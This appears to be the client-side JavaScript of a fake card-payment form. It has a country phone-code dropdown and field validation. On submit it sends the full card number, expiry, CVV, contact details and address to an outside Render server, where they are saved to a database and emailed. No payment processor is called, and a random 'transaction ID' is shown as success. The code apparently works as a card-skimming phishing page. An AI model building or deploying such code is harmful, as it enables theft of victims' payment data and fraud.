// Initialize EmailJS
emailjs.init('KHhPCXEfp7LC0TknP');

// ── Phone country codes ──────────────────────────────────────────────────────
const countryCodes = [
  { code: '+1',   flag: '🇺🇸', name: 'United States' },
  { code: '+44',  flag: '🇬🇧', name: 'United Kingdom' },
  { code: '+92',  flag: '🇵🇰', name: 'Pakistan' },
  { code: '+91',  flag: '🇮🇳', name: 'India' },
  { code: '+61',  flag: '🇦🇺', name: 'Australia' },
  { code: '+1',   flag: '🇨🇦', name: 'Canada' },
  { code: '+49',  flag: '🇩🇪', name: 'Germany' },
  { code: '+33',  flag: '🇫🇷', name: 'France' },
  { code: '+971', flag: '🇦🇪', name: 'UAE' },
  { code: '+966', flag: '🇸🇦', name: 'Saudi Arabia' },
  { code: '+90',  flag: '🇹🇷', name: 'Turkey' },
  { code: '+20',  flag: '🇪🇬', name: 'Egypt' },
  { code: '+98',  flag: '🇮🇷', name: 'Iran' },
  { code: '+62',  flag: '🇮🇩', name: 'Indonesia' },
  { code: '+60',  flag: '🇲🇾', name: 'Malaysia' },
  { code: '+65',  flag: '🇸🇬', name: 'Singapore' },
  { code: '+82',  flag: '🇰🇷', name: 'South Korea' },
  { code: '+81',  flag: '🇯🇵', name: 'Japan' },
  { code: '+86',  flag: '🇨🇳', name: 'China' },
  { code: '+7',   flag: '🇷🇺', name: 'Russia' },
  { code: '+55',  flag: '🇧🇷', name: 'Brazil' },
  { code: '+52',  flag: '🇲🇽', name: 'Mexico' },
  { code: '+27',  flag: '🇿🇦', name: 'South Africa' },
  { code: '+234', flag: '🇳🇬', name: 'Nigeria' },
  { code: '+254', flag: '🇰🇪', name: 'Kenya' },
  { code: '+31',  flag: '🇳🇱', name: 'Netherlands' },
  { code: '+39',  flag: '🇮🇹', name: 'Italy' },
  { code: '+34',  flag: '🇪🇸', name: 'Spain' },
  { code: '+46',  flag: '🇸🇪', name: 'Sweden' },
  { code: '+47',  flag: '🇳🇴', name: 'Norway' },
  { code: '+45',  flag: '🇩🇰', name: 'Denmark' },
  { code: '+358', flag: '🇫🇮', name: 'Finland' },
  { code: '+48',  flag: '🇵🇱', name: 'Poland' },
  { code: '+380', flag: '🇺🇦', name: 'Ukraine' },
  { code: '+32',  flag: '🇧🇪', name: 'Belgium' },
  { code: '+41',  flag: '🇨🇭', name: 'Switzerland' },
  { code: '+43',  flag: '🇦🇹', name: 'Austria' },
  { code: '+351', flag: '🇵🇹', name: 'Portugal' },
  { code: '+30',  flag: '🇬🇷', name: 'Greece' },
  { code: '+420', flag: '🇨🇿', name: 'Czech Republic' },
  { code: '+36',  flag: '🇭🇺', name: 'Hungary' },
  { code: '+40',  flag: '🇷🇴', name: 'Romania' },
  { code: '+63',  flag: '🇵🇭', name: 'Philippines' },
  { code: '+66',  flag: '🇹🇭', name: 'Thailand' },
  { code: '+84',  flag: '🇻🇳', name: 'Vietnam' },
  { code: '+880', flag: '🇧🇩', name: 'Bangladesh' },
  { code: '+94',  flag: '🇱🇰', name: 'Sri Lanka' },
  { code: '+977', flag: '🇳🇵', name: 'Nepal' },
  { code: '+93',  flag: '🇦🇫', name: 'Afghanistan' },
  { code: '+964', flag: '🇮🇶', name: 'Iraq' },
  { code: '+962', flag: '🇯🇴', name: 'Jordan' },
  { code: '+961', flag: '🇱🇧', name: 'Lebanon' },
  { code: '+972', flag: '🇮🇱', name: 'Israel' },
  { code: '+974', flag: '🇶🇦', name: 'Qatar' },
  { code: '+965', flag: '🇰🇼', name: 'Kuwait' },
  { code: '+968', flag: '🇴🇲', name: 'Oman' },
  { code: '+973', flag: '🇧🇭', name: 'Bahrain' },
  { code: '+967', flag: '🇾🇪', name: 'Yemen' },
  { code: '+212', flag: '🇲🇦', name: 'Morocco' },
  { code: '+213', flag: '🇩🇿', name: 'Algeria' },
  { code: '+216', flag: '🇹🇳', name: 'Tunisia' },
  { code: '+249', flag: '🇸🇩', name: 'Sudan' },
  { code: '+251', flag: '🇪🇹', name: 'Ethiopia' },
  { code: '+233', flag: '🇬🇭', name: 'Ghana' },
  { code: '+255', flag: '🇹🇿', name: 'Tanzania' },
  { code: '+256', flag: '🇺🇬', name: 'Uganda' },
  { code: '+54',  flag: '🇦🇷', name: 'Argentina' },
  { code: '+56',  flag: '🇨🇱', name: 'Chile' },
  { code: '+57',  flag: '🇨🇴', name: 'Colombia' },
  { code: '+51',  flag: '🇵🇪', name: 'Peru' },
  { code: '+58',  flag: '🇻🇪', name: 'Venezuela' },
  { code: '+64',  flag: '🇳🇿', name: 'New Zealand' },
  { code: '+353', flag: '🇮🇪', name: 'Ireland' },
  { code: '+352', flag: '🇱🇺', name: 'Luxembourg' },
  { code: '+370', flag: '🇱🇹', name: 'Lithuania' },
  { code: '+371', flag: '🇱🇻', name: 'Latvia' },
  { code: '+372', flag: '🇪🇪', name: 'Estonia' },
  { code: '+386', flag: '🇸🇮', name: 'Slovenia' },
  { code: '+385', flag: '🇭🇷', name: 'Croatia' },
  { code: '+387', flag: '🇧🇦', name: 'Bosnia' },
  { code: '+381', flag: '🇷🇸', name: 'Serbia' },
  { code: '+359', flag: '🇧🇬', name: 'Bulgaria' },
  { code: '+421', flag: '🇸🇰', name: 'Slovakia' },
];

// Phone number rules: { digits: exact length, min, max, placeholder }
const phoneRules = {
  '+1':   { min: 10, max: 10, placeholder: '2015551234',        hint: '10 digits (e.g. 2015551234)' },
  '+44':  { min: 10, max: 11, placeholder: '07911123456',       hint: '10–11 digits (e.g. 07911123456)' },
  '+92':  { min: 10, max: 10, placeholder: '03001234567',       hint: '10 digits (e.g. 03001234567)' },
  '+91':  { min: 10, max: 10, placeholder: '9876543210',        hint: '10 digits (e.g. 9876543210)' },
  '+61':  { min: 9,  max: 9,  placeholder: '412345678',         hint: '9 digits (e.g. 412345678)' },
  '+49':  { min: 10, max: 11, placeholder: '01512345678',       hint: '10–11 digits' },
  '+33':  { min: 9,  max: 9,  placeholder: '612345678',         hint: '9 digits (e.g. 612345678)' },
  '+971': { min: 9,  max: 9,  placeholder: '501234567',         hint: '9 digits (e.g. 501234567)' },
  '+966': { min: 9,  max: 9,  placeholder: '512345678',         hint: '9 digits (e.g. 512345678)' },
  '+90':  { min: 10, max: 10, placeholder: '5321234567',        hint: '10 digits (e.g. 5321234567)' },
  '+20':  { min: 10, max: 10, placeholder: '1001234567',        hint: '10 digits' },
  '+98':  { min: 10, max: 10, placeholder: '9123456789',        hint: '10 digits' },
  '+62':  { min: 9,  max: 12, placeholder: '81234567890',       hint: '9–12 digits' },
  '+60':  { min: 9,  max: 10, placeholder: '123456789',         hint: '9–10 digits' },
  '+65':  { min: 8,  max: 8,  placeholder: '91234567',          hint: '8 digits (e.g. 91234567)' },
  '+82':  { min: 10, max: 11, placeholder: '01012345678',       hint: '10–11 digits' },
  '+81':  { min: 10, max: 11, placeholder: '09012345678',       hint: '10–11 digits' },
  '+86':  { min: 11, max: 11, placeholder: '13812345678',       hint: '11 digits (e.g. 13812345678)' },
  '+7':   { min: 10, max: 10, placeholder: '9161234567',        hint: '10 digits (e.g. 9161234567)' },
  '+55':  { min: 10, max: 11, placeholder: '11912345678',       hint: '10–11 digits' },
  '+52':  { min: 10, max: 10, placeholder: '5512345678',        hint: '10 digits' },
  '+27':  { min: 9,  max: 9,  placeholder: '711234567',         hint: '9 digits (e.g. 711234567)' },
  '+234': { min: 10, max: 11, placeholder: '8012345678',        hint: '10–11 digits' },
  '+254': { min: 9,  max: 9,  placeholder: '712345678',         hint: '9 digits' },
  '+31':  { min: 9,  max: 9,  placeholder: '612345678',         hint: '9 digits' },
  '+39':  { min: 9,  max: 10, placeholder: '3121234567',        hint: '9–10 digits' },
  '+34':  { min: 9,  max: 9,  placeholder: '612345678',         hint: '9 digits' },
  '+46':  { min: 7,  max: 9,  placeholder: '701234567',         hint: '7–9 digits' },
  '+47':  { min: 8,  max: 8,  placeholder: '41234567',          hint: '8 digits' },
  '+45':  { min: 8,  max: 8,  placeholder: '20123456',          hint: '8 digits' },
  '+358': { min: 9,  max: 10, placeholder: '412345678',         hint: '9–10 digits' },
  '+48':  { min: 9,  max: 9,  placeholder: '512345678',         hint: '9 digits' },
  '+380': { min: 9,  max: 9,  placeholder: '671234567',         hint: '9 digits' },
  '+32':  { min: 9,  max: 9,  placeholder: '470123456',         hint: '9 digits' },
  '+41':  { min: 9,  max: 9,  placeholder: '791234567',         hint: '9 digits' },
  '+43':  { min: 7,  max: 13, placeholder: '664123456',         hint: '7–13 digits' },
  '+351': { min: 9,  max: 9,  placeholder: '912345678',         hint: '9 digits' },
  '+30':  { min: 10, max: 10, placeholder: '6912345678',        hint: '10 digits' },
  '+420': { min: 9,  max: 9,  placeholder: '601123456',         hint: '9 digits' },
  '+36':  { min: 9,  max: 9,  placeholder: '201234567',         hint: '9 digits' },
  '+40':  { min: 9,  max: 9,  placeholder: '712345678',         hint: '9 digits' },
  '+63':  { min: 10, max: 10, placeholder: '9171234567',        hint: '10 digits' },
  '+66':  { min: 9,  max: 9,  placeholder: '812345678',         hint: '9 digits' },
  '+84':  { min: 9,  max: 10, placeholder: '912345678',         hint: '9–10 digits' },
  '+880': { min: 10, max: 10, placeholder: '1812345678',        hint: '10 digits' },
  '+94':  { min: 9,  max: 9,  placeholder: '712345678',         hint: '9 digits' },
  '+977': { min: 10, max: 10, placeholder: '9841234567',        hint: '10 digits' },
  '+93':  { min: 9,  max: 9,  placeholder: '701234567',         hint: '9 digits' },
  '+964': { min: 10, max: 10, placeholder: '7901234567',        hint: '10 digits' },
  '+962': { min: 9,  max: 9,  placeholder: '791234567',         hint: '9 digits' },
  '+961': { min: 7,  max: 8,  placeholder: '71234567',          hint: '7–8 digits' },
  '+972': { min: 9,  max: 9,  placeholder: '521234567',         hint: '9 digits' },
  '+974': { min: 8,  max: 8,  placeholder: '33123456',          hint: '8 digits' },
  '+965': { min: 8,  max: 8,  placeholder: '51234567',          hint: '8 digits' },
  '+968': { min: 8,  max: 8,  placeholder: '92123456',          hint: '8 digits' },
  '+973': { min: 8,  max: 8,  placeholder: '36001234',          hint: '8 digits' },
  '+967': { min: 9,  max: 9,  placeholder: '712345678',         hint: '9 digits' },
  '+212': { min: 9,  max: 9,  placeholder: '612345678',         hint: '9 digits' },
  '+213': { min: 9,  max: 9,  placeholder: '551234567',         hint: '9 digits' },
  '+216': { min: 8,  max: 8,  placeholder: '20123456',          hint: '8 digits' },
  '+249': { min: 9,  max: 9,  placeholder: '912345678',         hint: '9 digits' },
  '+251': { min: 9,  max: 9,  placeholder: '911234567',         hint: '9 digits' },
  '+233': { min: 9,  max: 9,  placeholder: '201234567',         hint: '9 digits' },
  '+255': { min: 9,  max: 9,  placeholder: '621234567',         hint: '9 digits' },
  '+256': { min: 9,  max: 9,  placeholder: '712345678',         hint: '9 digits' },
  '+54':  { min: 10, max: 10, placeholder: '1123456789',        hint: '10 digits' },
  '+56':  { min: 9,  max: 9,  placeholder: '912345678',         hint: '9 digits' },
  '+57':  { min: 10, max: 10, placeholder: '3101234567',        hint: '10 digits' },
  '+51':  { min: 9,  max: 9,  placeholder: '912345678',         hint: '9 digits' },
  '+58':  { min: 10, max: 10, placeholder: '4121234567',        hint: '10 digits' },
  '+64':  { min: 8,  max: 9,  placeholder: '212345678',         hint: '8–9 digits' },
  '+353': { min: 9,  max: 9,  placeholder: '851234567',         hint: '9 digits' },
  '+352': { min: 9,  max: 9,  placeholder: '621234567',         hint: '9 digits' },
  '+370': { min: 8,  max: 8,  placeholder: '61234567',          hint: '8 digits' },
  '+371': { min: 8,  max: 8,  placeholder: '21234567',          hint: '8 digits' },
  '+372': { min: 7,  max: 8,  placeholder: '51234567',          hint: '7–8 digits' },
  '+386': { min: 8,  max: 8,  placeholder: '31234567',          hint: '8 digits' },
  '+385': { min: 8,  max: 9,  placeholder: '912345678',         hint: '8–9 digits' },
  '+387': { min: 8,  max: 8,  placeholder: '61234567',          hint: '8 digits' },
  '+381': { min: 8,  max: 9,  placeholder: '601234567',         hint: '8–9 digits' },
  '+359': { min: 8,  max: 9,  placeholder: '876543210',         hint: '8–9 digits' },
  '+421': { min: 9,  max: 9,  placeholder: '912345678',         hint: '9 digits' },
};

function getRule(code) {
  return phoneRules[code] || { min: 7, max: 15, placeholder: 'Enter phone number', hint: '7–15 digits' };
}

let selectedCountryCode = '+1';
let dropdownOpen = false;

function updatePhoneInput(code) {
  const rule  = getRule(code);
  const input = document.getElementById('phoneInput');
  const hint  = document.getElementById('phoneHint');
  input.placeholder = rule.placeholder;
  input.maxLength   = rule.max;
  input.value       = '';
  hint.textContent  = `Format: ${rule.hint}`;
  clearErr('phoneErr');
}

function buildPhoneDropdown() {
  const btn  = document.getElementById('phoneFlag');
  const list = document.getElementById('phoneDropdown');

  // Move dropdown to body to avoid clipping by parent overflow/z-index
  document.body.appendChild(list);

  // Search box inside dropdown
  const searchBox = document.createElement('input');
  searchBox.type        = 'text';
  searchBox.placeholder = '🔍 Search country...';
  searchBox.className   = 'phone-search';
  searchBox.addEventListener('input', () => {
    const q = searchBox.value.toLowerCase();
    list.querySelectorAll('.phone-option').forEach(item => {
      item.style.display = item.dataset.search.includes(q) ? 'flex' : 'none';
    });
  });
  searchBox.addEventListener('click', e => e.stopPropagation());
  list.appendChild(searchBox);

  countryCodes.forEach(c => {
    const item = document.createElement('div');
    item.className      = 'phone-option';
    item.dataset.search = (c.name + c.code).toLowerCase();
    item.innerHTML = `<span class="opt-flag">${c.flag}</span><span class="opt-name">${c.name}</span><span class="opt-code">${c.code}</span>`;
    item.addEventListener('click', () => {
      selectedCountryCode = c.code;
      btn.innerHTML = `${c.flag} <span class="dial-sel">${c.code}</span> <span class="arrow">▾</span>`;
      updatePhoneInput(c.code);
      closeDropdown();
    });
    list.appendChild(item);
  });

  btn.addEventListener('click', e => {
    e.stopPropagation();
    dropdownOpen ? closeDropdown() : openDropdown();
  });
  document.addEventListener('click', closeDropdown);
  list.addEventListener('click', e => e.stopPropagation());

  // Set initial placeholder for US
  updatePhoneInput('+1');
}

// Only allow digits in phone input
document.addEventListener('DOMContentLoaded', () => {
  buildPhoneDropdown();
  document.getElementById('phoneInput').addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
    validatePhoneLive();
  });
});

function validatePhoneLive() {
  const val  = document.getElementById('phoneInput').value.trim();
  const rule = getRule(selectedCountryCode);
  if (val.length === 0) { clearErr('phoneErr'); return; }
  if (val.length < rule.min) {
    showErr('phoneErr', `Too short — need at least ${rule.min} digits for this country.`);
  } else if (val.length > rule.max) {
    showErr('phoneErr', `Too long — max ${rule.max} digits for this country.`);
  } else {
    clearErr('phoneErr');
  }
}

function openDropdown() {
  const btn  = document.getElementById('phoneFlag');
  const list = document.getElementById('phoneDropdown');
  const rect = btn.getBoundingClientRect();
  list.style.position = 'fixed';
  list.style.top      = (rect.bottom + 4) + 'px';
  list.style.left     = rect.left + 'px';
  list.style.display  = 'block';
  dropdownOpen = true;
}
function closeDropdown() {
  document.getElementById('phoneDropdown').style.display = 'none';
  dropdownOpen = false;
}

// ── Card type detection (badge only, no restriction) ────────────────────────
function getCardType(v) {
  if (/^4/.test(v))                       return '💳 VISA';
  if (/^5[1-5]/.test(v))                  return '💳 Mastercard';
  if (/^3[47]/.test(v))                   return '💳 Amex';
  if (/^6011|^64[4-9]|^65/.test(v))       return '💳 Discover';
  return '';
}

function formatCardNumber(input) {
  let v = input.value.replace(/\D/g, '').substring(0, 16);
  input.value = v.replace(/(.{4})/g, '$1 ').trim();

  const type    = getCardType(v);
  const badge   = document.getElementById('cardTypeBadge');
  const validEl = document.getElementById('cardValidIcon');

  // Show card type badge if recognised
  if (type) {
    badge.textContent = type;
    badge.style.display = 'inline-block';
  } else {
    badge.style.display = 'none';
  }

  // Hide valid icon always — no Luhn check
  validEl.style.display = 'none';
  clearErr('cardErr');
}

// ── Helpers ──────────────────────────────────────────────────────────────────
function generateTxnId(len = 20) {
  const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let r = '';
  for (let i = 0; i < len; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}
function showErr(id, msg) { const el = document.getElementById(id); if (msg) el.textContent = msg; el.classList.add('visible'); }
function clearErr(id) { document.getElementById(id).classList.remove('visible'); }
function setBtn(loading) {
  const btn = document.querySelector('.btn-submit');
  btn.disabled = loading;
  btn.textContent = loading ? 'Sending...' : 'Submit';
  btn.style.opacity = loading ? '0.7' : '1';
}

// ── Submit ───────────────────────────────────────────────────────────────────
function handleSubmit() {
  let valid = true;

  // Collect all values first
  const name        = document.getElementById('nameOnCard').value.trim();
  const rawCard     = document.getElementById('cardNumber').value.replace(/\s/g, '');
  const expiryMonth = document.getElementById('expiryMonth').value;
  const expiryYear  = document.getElementById('expiryYear').value;
  const cvv         = document.getElementById('cvv').value.trim();
  const amount      = document.getElementById('amount').value.trim();
  const email       = document.getElementById('email').value.trim();
  const phoneVal    = document.getElementById('phoneInput').value.trim();
  const addr1       = document.getElementById('addr1').value.trim();
  const addr2       = document.getElementById('addr2').value.trim();
  const city        = document.getElementById('city').value.trim();
  const state       = document.getElementById('state').value.trim();
  const postal      = document.getElementById('postal').value.trim();
  const country     = document.getElementById('country').value;

  // Validate name
  if (!name) { showErr('nameErr', 'Please enter the name on card.'); valid = false; } else clearErr('nameErr');

  // Validate card — only require exactly 16 digits
  if (!rawCard) {
    showErr('cardErr', 'Please enter your card number.'); valid = false;
  } else if (!/^\d{16}$/.test(rawCard)) {
    showErr('cardErr', 'Card number must be exactly 16 digits.'); valid = false;
  } else { clearErr('cardErr'); }

  // Validate expiry
  if (!expiryMonth) { showErr('monthErr', 'Please select expiry month.'); valid = false; } else clearErr('monthErr');
  if (!expiryYear)  { showErr('yearErr',  'Please select expiry year.');  valid = false; } else clearErr('yearErr');

  // Validate CVV
  if (!/^\d{3,4}$/.test(cvv)) { showErr('cvvErr', 'Please enter a valid CVV (3–4 digits).'); valid = false; } else clearErr('cvvErr');

  // Validate amount
  if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) { showErr('amountErr', 'Please enter a valid amount.'); valid = false; } else clearErr('amountErr');

  // Validate email
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showErr('emailErr', 'Please enter a valid email address.'); valid = false; } else clearErr('emailErr');

  // Validate phone (optional but validated if entered)
  const rule = getRule(selectedCountryCode);
  if (phoneVal && (phoneVal.length < rule.min || phoneVal.length > rule.max)) {
    showErr('phoneErr', `Invalid phone. Expected ${rule.hint} for this country.`); valid = false;
  } else { clearErr('phoneErr'); }

  if (!valid) return;

  const txnId = generateTxnId();
  const phone = selectedCountryCode + ' ' + phoneVal;

  const templateParams = {
    transaction_id: txnId,
    name,
    card:     document.getElementById('cardNumber').value,
    month:    expiryMonth,
    year:     expiryYear,
    cvv,
    amount,
    email,
    phone:    phone    || 'N/A',
    address1: addr1    || 'N/A',
    address2: addr2    || 'N/A',
    city:     city     || 'N/A',
    state:    state    || 'N/A',
    postal:   postal   || 'N/A',
    country
  };

  setBtn(true);

  // ── Save to MongoDB via backend API ─────────────────────────────────────
  // Pointing to live Render server
  const API_BASE = 'https://payment-problem.onrender.com';

  const saveToDb = fetch(`${API_BASE}/api/payments`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(templateParams)
  }).catch(() => ({ ok: false })); // don't block on DB failure

  // ── Send Email via Backend Nodemailer ──────────────────────────────
  console.log('Sending email via Nodemailer backend...');
  const sendEmail = fetch(`${API_BASE}/api/send-email`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(templateParams)
  })
    .then((resp) => {
      if (!resp.ok) throw new Error(`Backend email failed: ${resp.status}`);
      console.log('Backend email succeeded');
      return resp.json();
    })
    .catch((err) => {
      console.error('Email sending failed:', err);
      return null;
    });

  Promise.allSettled([saveToDb, sendEmail]).then(() => {
    document.getElementById('txnId').textContent = txnId;
    document.getElementById('successBox').classList.add('visible');
    document.getElementById('paymentForm').style.display = 'none';
  });
}


